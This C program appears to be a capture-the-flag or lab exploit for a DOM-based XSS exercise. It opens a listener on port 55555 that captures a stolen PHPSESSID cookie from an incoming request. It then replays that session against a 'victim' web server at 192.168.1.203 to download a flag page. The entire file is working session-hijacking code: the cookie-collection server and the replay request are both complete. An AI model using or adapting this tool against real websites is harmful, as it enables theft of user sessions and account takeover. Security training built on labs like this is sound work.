#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define FLAG_PAGE "/studentManagerDOMBASED.php"
#define FLAG_FILENAME "spoofed-dom.txt"
#define VICTIM_HOST "192.168.1.203"
#define VICTIM_PORT 80
#define SERVER_PORT 55555
#define RESPONSE_BUF_SZ 4096
#define VICTIM_REQUEST_BUF_SZ 2048
#define SESSID_BUF_SZ 64 // max len for phpsessid is 32 chars + \0, so this buffer has a margin of safety

int create_victim_socket() {
    int sockfd;
    struct sockaddr_in server_addr;
    int opt = 1;

    // Initialize socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    // Set socket options
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(sockfd);
        return -1;
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        close(sockfd);
        return -1;
    }

    // Build web server address struct
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(VICTIM_PORT);
    if (inet_pton(AF_INET, VICTIM_HOST, &server_addr.sin_addr) <= 0) {
        close(sockfd);
        return -1;
    }

    // Connect to victim
    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }

    return sockfd;
}

int extract_phpsessid_from_buffer(char buffer[VICTIM_REQUEST_BUF_SZ], char sessid[SESSID_BUF_SZ]) {
    // Get pointer to start of PHPSESSID cookie
    char *start = strstr(buffer, "PHPSESSID=");
    if (start) {
        // Capture chars (up to 63) until ; (end of cookie), space, newline or % (start of encoded char) are encountered.
        int num_captures = sscanf(start, "PHPSESSID=%63[^;&% \r\n]", sessid);
        if (num_captures == 1) {
            return 0;
        }
    }
    return -1;
}

char *capture_phpsessid(size_t *sessid_len) {
    int server_socket, client_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[VICTIM_REQUEST_BUF_SZ] = {0};
    char *sessid = (char*)malloc(SESSID_BUF_SZ);

    int opt = 1;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    // Set socket options
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        free(sessid);
        return NULL;
    }
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        free(sessid);
        return NULL;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(SERVER_PORT);

    if (bind(server_socket, (struct sockaddr *) &address, sizeof(address)) < 0) {
        close(server_socket);
        free(sessid);
        return NULL;
    }

    listen(server_socket, 1);

    client_socket = accept(server_socket, (struct sockaddr *) &address, (socklen_t *) &addrlen);
    if (client_socket >= 0) {
        ssize_t bytes_received = read(client_socket, buffer, sizeof(buffer) - 1);

        if (bytes_received < 0) {
            close(client_socket);
            close(server_socket);
            return NULL;
        }

        if (extract_phpsessid_from_buffer(buffer, sessid) < 0) {
            close(client_socket);
            close(server_socket);
            return NULL;
        }

        char *response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        send(client_socket, response, strlen(response), 0);
        close(client_socket);
    }

    close(server_socket);
    *sessid_len = strlen(sessid);
    return sessid;
}
int get_flag(int victim_sockfd, char *phpsessid) {
    char buffer[RESPONSE_BUF_SZ];

    snprintf(buffer, sizeof(buffer),
        "GET " FLAG_PAGE " HTTP/1.1\r\n"
        "Host: 192.168.1.203\r\n"
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Cookie: PHPSESSID=%s\r\n"
        "Connection: close\r\n"
        "\r\n",
        phpsessid
    );

    if (send(victim_sockfd, buffer, strlen(buffer), 0) < 0) return -1;

    FILE *fp = fopen(FLAG_FILENAME, "wb");
    if (fp == NULL) return -1;

    ssize_t bytes_received;
    while ((bytes_received = recv(victim_sockfd, buffer, sizeof(buffer), 0)) > 0) {
        fwrite(buffer, 1, (size_t)bytes_received, fp);
    }

    fclose(fp);

    if (bytes_received < 0) return -1;

    return 0;
}

int main() {
    // Get PHPSESSID
    size_t sessid_len;
    char *phpsessid = capture_phpsessid(&sessid_len);
    if (phpsessid == NULL) {
        return -1;
    }

    // Get the flag from the victim website using the PHPSESSID
    int sockfd = create_victim_socket();
    if (sockfd < 0) {
        free(phpsessid);
        return -1;
    }
    int status = get_flag(sockfd, phpsessid);

    // Teardown
    close(sockfd);
    free(phpsessid);
    return status;
}
